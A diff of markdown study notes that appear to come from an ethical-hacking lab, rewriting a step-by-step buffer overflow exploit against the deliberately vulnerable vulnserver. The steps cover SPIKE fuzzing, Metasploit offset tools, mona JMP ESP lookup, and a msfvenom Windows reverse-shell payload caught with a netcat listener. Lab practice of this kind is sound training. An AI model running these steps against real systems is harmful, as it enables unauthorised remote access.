@@ -43,34 +43,35 @@ Ninja is installed in victim machine and Jonin is installed on the attacker mach
 modifiy constants.json set ip and port
 when receiving access denied on listener "list" -> "connect 1" -> change -> cmd
 
-- Perform buffer overflow attack to gain access to a remote system
-trun.spk
-    s_readline();
-    s_string(“TRUN ”);
-    s_string_variable(“0”);
-generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
-fuzz.py
-
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900
-findoff.py
-
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337
-overwrite.py
-
-badchars.py
-in immunity debugger: !mona modules
-
-/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
-    JMP ESP
-    EXIT
-
-!mona find -s “\xff\xe4” -m essfunc.dll --> 0x625011af
-
-jump.py
-
-msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -ax86 -b “\x00”
-
-shellcode.py
+- Perform buffer overflow attack to gain access to a remote system  
+    1. Start vulnserver as administrator  
+    2. Start and attach to process Immunity debugger  
+    3. Create file:  
+        trun.spk  
+            s_readline();  
+            s_string("TRUN ");  
+            s_string_variable("0");  
+        generic_send_tcp 10.10.1.11 9999 trun.spk 0 0
+    4. Relaunch vulnserver  
+    5. execute fuzz.py
+    6. generate pattern /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 11900
+    7. relaunch vulnserver
+    8. execute findoff.py after pasting pattern
+    9. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 11900 -q 386F4337 (last value from EIP in immunity debugger)  
+    10. overwrite.py
+    11. badchars.py  
+    12. in immunity debugger: 
+        follow in DUMP ESP value (right click)  
+    13. restart immunity debugger:  
+        !mona modules (copy mona.py in pycommands program files immunity debugger)  
+    14. /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb  
+        JMP ESP  --> FFE4  
+        EXIT
+    15. !mona find -s “\xff\xe4” -m essfunc.dll --> 0x625011af  
+    16. set breakpoint with go to disassembler and execute jump.py  
+    17. msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.13 LPORT=4445 EXITFUNC=thread -f c -ax86 -b “\x00”
+    19. nc -lvnp 4445
+    18. copy the generated shellcode and execute shellcode.py
 
 ## Perform privilege escalation to gain higher privileges
 
